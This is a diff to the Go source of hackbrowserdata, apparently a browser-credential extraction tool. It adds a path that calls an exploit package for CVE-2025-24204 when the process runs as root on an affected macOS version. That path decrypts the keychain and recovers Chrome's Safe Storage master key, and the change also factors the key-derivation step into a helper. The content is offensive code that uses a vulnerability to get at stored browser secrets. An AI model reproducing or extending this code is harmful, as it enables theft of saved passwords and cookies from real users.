@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"strings"
 
+	"github.com/moond4rk/hackbrowserdata/browser/exploit/cve2025_24204"
 	"github.com/moond4rk/hackbrowserdata/crypto"
 	"github.com/moond4rk/hackbrowserdata/log"
 	"github.com/moond4rk/hackbrowserdata/types"
@@ -24,6 +25,24 @@ var (
 func (c *Chromium) GetMasterKey() ([]byte, error) {
 	// don't need chromium key file for macOS
 	defer os.Remove(types.ChromiumKey.TempFilename())
+
+	// Try get the master key via CVE-2025-24204
+	if cve2025_24204.GetMacOSVersion() == cve2025_24204.ExploitOSVersion {
+		if os.Geteuid() == 0 {
+			secret, err := cve2025_24204.DecryptKeychain(c.storage)
+			if err == nil {
+				log.Debugf("get master key via CVE-2025-24204 success, browser %s", c.name)
+				if key, err := c.parseSecret([]byte(secret)); err == nil {
+					return key, nil
+				}
+			}
+
+			log.Warnf("get master key via CVE-2025-24204 failed: %v", err)
+		} else {
+			log.Warnf("CVE-2025-24204 exploit requires root privileges, skipping...")
+		}
+	}
+
 	// Get the master key from the keychain
 	// $ security find-generic-password -wa 'Chrome'
 	var (
@@ -43,10 +62,15 @@ func (c *Chromium) GetMasterKey() ([]byte, error) {
 		return nil, errors.New(stderr.String())
 	}
 
-	secret := bytes.TrimSpace(stdout.Bytes())
+	return c.parseSecret(stdout.Bytes())
+}
+
+func (c *Chromium) parseSecret(secret []byte) ([]byte, error) {
+	secret = bytes.TrimSpace(secret)
 	if len(secret) == 0 {
 		return nil, errWrongSecurityCommand
 	}
+
 	salt := []byte("saltysalt")
 	// @https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
 	key := crypto.PBKDF2Key(secret, salt, 1003, 16, sha1.New)
